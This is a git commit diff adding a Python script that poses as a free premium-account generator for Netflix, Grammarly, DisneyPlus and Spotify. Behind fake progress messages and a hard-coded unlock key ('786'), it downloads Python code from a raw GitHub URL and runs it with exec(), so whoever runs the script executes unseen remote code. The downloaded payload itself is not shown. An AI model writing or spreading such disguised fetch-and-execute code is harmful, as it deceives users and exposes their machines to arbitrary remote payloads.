83f0ce16f03f7cc96e86765796f997739992d23f
PKZOID <93982559+PKZOID@users.noreply.github.com>
2022-11-08 15:40:11 +0500

    Update Netflix.py

--- Netflix.py
+++ Netflix.py
@@ -1,1 +1,38 @@
-print("Download Account From:")
+import time
+import urllib.request
+
+class account_gen:
+    def account():
+        u = input("1:Netflix 2:Grammarly 3:DisneyPlus 4:Spotify\n")
+        if u == "1":
+            print("Account Downloading From Internet")
+            time.sleep(1)
+            print("Account Verification..........")
+            time.sleep(1)
+            print("Key Generate Please Wait.....")
+            time.sleep(1)
+            print("Account Find From Database")
+            time.sleep(1)
+            print("Downloading From Database Premium Cookie")
+            time.sleep(1)
+            print("Start Downloading........")
+            code = 'https://raw.githubusercontent.com/PKZOID/Database/main/Netflix.py'
+            response = urllib.request.urlopen(code)
+            data = response.read()
+            time.sleep(1)
+            print("download completed successfully")
+            print("Enter Key to Unlock")
+            print("Key Get From: www.pkzoid.blogpsot.com")
+            key = input("Enter Key to Unlock: ")
+            if key == "786":
+                print("Thanks For Login")
+                time.sleep(5)
+                print("Login Successful")
+                exec(data)
+            else:
+                print("Login Failed")
+                print("Try Get From www.Pkzoid.blogspot.com")
+        else:
+            print("Try Agin")
+
+
